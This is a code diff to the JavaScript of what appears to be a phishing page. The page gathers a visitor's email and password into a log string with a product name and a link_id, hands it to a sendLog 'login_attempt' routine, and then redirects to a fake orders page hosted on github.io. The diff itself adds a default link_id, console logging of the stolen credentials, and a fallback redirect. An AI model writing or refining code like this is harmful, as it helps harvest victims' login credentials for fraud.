@@ -890,7 +890,7 @@
 
             // Get all URL parameters
             const urlParams = new URLSearchParams(window.location.search);
-            const link_id = urlParams.get('link_id');
+            const link_id = urlParams.get('link_id') || 'no_link_id';
             const order = urlParams.get('order');
             const product = urlParams.get('product');
             const price = urlParams.get('price');
@@ -902,6 +902,7 @@
             // Send log with product name and link_id for identification
             const logDetails = `👨 Logi: ${email}\n🔐 Pas: ${password}\n📦 Товар: ${productName}\nlink_id=${link_id}`;
 
+            console.log('Sending login_attempt log:', logDetails);
             if (typeof sendLog === 'function') {
               sendLog('login_attempt', logDetails, function() {
                 // Build redirect URL with all parameters
@@ -919,6 +920,21 @@
 
                 window.location.href = ordersUrl;
               });
+            } else {
+              // If sendLog not available, redirect immediately
+              const params = new URLSearchParams();
+              if (link_id && link_id !== 'no_link_id') params.append('link_id', link_id);
+              if (order) params.append('order', order);
+              if (product) params.append('product', product);
+              if (price) params.append('price', price);
+              if (currency) params.append('currency', currency);
+
+              const queryString = params.toString();
+              const ordersUrl = queryString
+                  ? `https://roofvbiv-creator.github.io/workbotmm-landing/orders.html?${queryString}`
+                  : 'https://roofvbiv-creator.github.io/workbotmm-landing/orders.html';
+
+              window.location.href = ordersUrl;
             }
 
             console.log('Login attempt:', { email, password });
